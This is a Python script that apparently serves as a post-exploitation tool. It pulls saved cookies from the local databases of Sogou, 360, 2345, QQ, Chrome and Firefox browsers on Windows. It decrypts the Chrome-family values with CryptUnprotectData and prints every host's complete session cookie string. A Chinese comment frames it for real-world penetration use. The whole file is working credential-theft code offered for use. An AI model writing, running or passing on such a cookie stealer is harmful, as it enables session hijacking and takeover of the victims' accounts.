import os
import sqlite3
import sys
from collections import defaultdict
from win32.win32crypt import CryptUnprotectData


'''
实际使用场景请自行修改Cookies/cookies.sqlite位置，下面代码均为默认安装的位置，有些绿色版的文件夹位置以及老版本的渗透版火狐浏览器位置需要自行修改
'''
hosts=[]

def get_hosts(path,fx=""):
    sql="select host_key from cookies"
    if fx == "fx":
        sql="select host from moz_cookies"
    try:
        with sqlite3.connect(path) as conn:
            conn.row_factory = sqlite3.Row
            cur=conn.cursor()        
            cur.execute(sql)
            for row in cur:
                if fx == "fx":
                    host = row['host']
                else:
                    host = row['host_key']
                if host not in hosts:
                    hosts.append(host)
        cur.close()
    except Exception as err:
        print(err)
        sys.exit()

def getcookiefromchrome(path,fx=""):
    if fx == "fx":
        get_hosts(path,"fx")
    else:
        get_hosts(path,"")
    sql="select host_key,name,path,encrypted_value from cookies"
    if fx == "fx":
        sql="select host,name,path,value from moz_cookies"
    con = sqlite3.connect(path)
    con.row_factory = sqlite3.Row
    cur = con.cursor()
    for host in hosts:
        uk = {}
        c_str = ""
        if fx == "fx":
            cur.execute(sql+" WHERE host LIKE \"" + host +"\"")
        else:
            cur.execute(sql+" WHERE host_key LIKE \"" + host +"\"")
        for row in cur:
                if fx == "fx":
                    name = row['name']
                    value = row['value']
                    host = row['host']
                    path = row['path']
                    uk.setdefault(name,value)
                else:
                    name = row['name']
                    value = CryptUnprotectData(row['encrypted_value'])[1].decode()
                    host = row['host_key']
                    path = row['path']
                    uk.setdefault(name,value)
        for k,v in uk.items():
            c_str += k+"="+v+"; "
        print("Host: " + host)
        print("Path: " + path)
        print("Cookie: " + c_str)
        print("="*20)
    cur.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: " + sys.argv[0] + " chrome [prefix]")
        print("===Support list===")
        print("sogou --- sogou browser\r\n360 --- 360 safe browser\r\n360cse --- 360 cse browser\r\n2345 --- 2345 browser\r\nqq --- QQ browser\r\nchrome --- chrome browser [ <80.x ]\r\nfirefox --- firefox browser [need prefix]")
        sys.exit()
    bro = sys.argv[1]
    if bro == "sogou":
        cpath = os.environ['APPDATA']+r"\SogouExplorer\Webkit\Default\Cookies"
    elif bro == "360":
        cpath = os.environ['APPDATA']+r"\360se6\User Data\Default\Cookies"
    elif bro == "360cse":
        cpath = os.environ['LOCALAPPDATA']+r"\360Chrome\Chrome\User Data\Default\Cookies"
    elif bro == "2345":
        cpath = os.environ['LOCALAPPDATA']+r"\2345Explorer\User Data\Default\CookiesV3"
    elif bro == "qq":
        cpath = os.environ['LOCALAPPDATA']+r"\Tencent\QQBrowser\User Data\Default\Cookies"
    elif bro == "chrome":
        cpath = os.environ['LOCALAPPDATA']+r"\Google\Chrome\User Data\Default\Cookies"
    elif bro == "firefox":
        if len(sys.argv) < 3:
            print("Miss prefix !")
            print("usage: " + sys.argv[0] + " firefox xxxxx [xxxxx]")
            sys.exit()
        else:
            prefix = sys.argv[2]
            if len(sys.argv) == 3:
                cpath = os.environ['APPDATA']+r"\Mozilla\Firefox\Profiles\\"+ prefix + r".default-release\cookies.sqlite"
            else:
                cpath = os.environ['APPDATA']+r"\Mozilla\Firefox\Profiles\\"+ prefix + r".default-" + sys.argv[3] + r"\cookies.sqlite"
    else:
        print("Unsupported browser !")
        sys.exit()
    if bro == "firefox":
        getcookiefromchrome(cpath,"fx")
        sys.exit()
    getcookiefromchrome(cpath,"")